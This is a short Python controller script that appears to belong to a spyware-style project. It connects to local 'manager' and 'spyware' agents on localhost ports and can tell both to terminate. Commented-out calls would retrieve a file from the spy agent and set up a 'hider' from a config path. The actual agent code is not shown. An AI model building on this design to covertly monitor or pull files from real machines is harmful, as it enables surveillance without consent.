from connection import Connection
from agent import Agent
from command import Command
from responce import Responce
from funCode import FunCode
from time import sleep
import configparser

HOST = "localhost"
PORT_MANEGER = 65432
PORT_SPYWARE = 65410


def clean():
    spyAgent = Agent(HOST, PORT_SPYWARE)
    agent = Agent(HOST, PORT_MANEGER)
    agent.suicide()
    spyAgent.suicide()


def main():
    config = configparser.ConfigParser()
    config.read('config.ini')

    targetHiderPath = config['hider']['target_path']
    
    """
    spyAgent = Agent(HOST, PORT_SPYWARE)
    print(spyAgent.retrieve_file("fishfish.txt"))
    """
    # print(spyAgent.hider_setup(targetHiderPath))


if __name__ == "__main__":
    # main()
    clean()
